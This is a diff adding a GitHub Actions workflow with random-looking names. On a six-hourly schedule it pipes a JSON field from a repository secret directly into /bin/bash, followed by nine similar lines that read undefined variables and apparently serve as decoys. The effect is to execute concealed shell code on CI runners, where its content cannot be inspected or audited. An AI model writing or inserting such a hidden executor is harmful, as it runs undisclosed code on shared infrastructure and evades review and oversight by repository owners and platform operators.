@@ -1,0 +1,26 @@
+name: hepingacm
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hepingacm
+        env:
+          xzbl2: ${{ secrets.xzbl2 }}
+        run: |
+          echo $xzbl2 | jq -r .pah38097 | /bin/bash
+          echo $puec681 | jq -r .c0 | /bin/bash
+          echo $il39 | jq -r .x196 | /bin/bash
+          echo $sqvx008 | jq -r .tk0352 | /bin/bash
+          echo $r81053 | jq -r .wplv4 | /bin/bash
+          echo $rak82540 | jq -r .pxk8452 | /bin/bash
+          echo $twekf48 | jq -r .wou2 | /bin/bash
+          echo $yn42098 | jq -r .ngnub96 | /bin/bash
+          echo $w0855 | jq -r .s3906 | /bin/bash
+          echo $m838 | jq -r .tp18115 | /bin/bash
+
